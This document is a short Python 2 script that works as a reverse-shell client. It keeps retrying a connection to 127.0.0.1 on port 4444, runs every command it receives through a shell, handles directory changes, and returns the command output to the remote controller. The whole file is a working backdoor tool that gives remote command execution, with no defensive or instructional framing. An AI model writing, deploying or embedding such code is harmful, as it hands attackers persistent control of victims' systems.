import subprocess, os
from socket import *
 
host = "127.0.0.1"
port = 4444
 
def main():
        while 1:
                s=socket(AF_INET, SOCK_STREAM)
                while 1:
                        try:
                                s.connect((host,port))
                                print "[INFO] Connected"
                                break;
                        except:
                                pass
               
                while 1:
                        try:
                                msg=s.recv(4096)
                                if ((msg != "exit") and ("cd " not in msg) and (msg != "STP5940")):
                                        comm = subprocess.Popen(str(msg), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                                        STDOUT, STDERR = comm.communicate()
                                        en_STDERR = bytearray(STDERR)
                                        en_STDOUT = bytearray(STDOUT)
                                        comm.kill()
                                        if (en_STDERR == ""): #dealing with invalid commands
                                                if (en_STDOUT != ""): #if the command has an output
                                                        print en_STDOUT
                                                        s.send(en_STDOUT)
                                                else: # if the command has not output then
                                                        s.send("[CLIENT] Command Executed")
                                        else:
                                                print en_STDERR
                                                s.send(en_STDERR)
                                elif ("cd " in msg): #dealing with the cd command
                                        msg = msg.replace("cd ","")
                                        os.chdir(msg)
                                        s.send(os.getcwd())
                                        print "[INFO] Changed dir to %s" % os.getcwd()
                                elif (msg == "STP5940"): #welcome message
                                        s.send(os.getcwd())
                                else:
                                        print "[INFO] Connection Closed"
                                        s.close()
                                        break
                        except:
                                print "[INFO] Connection Closed"
                                s.close()
                                break
                               
main()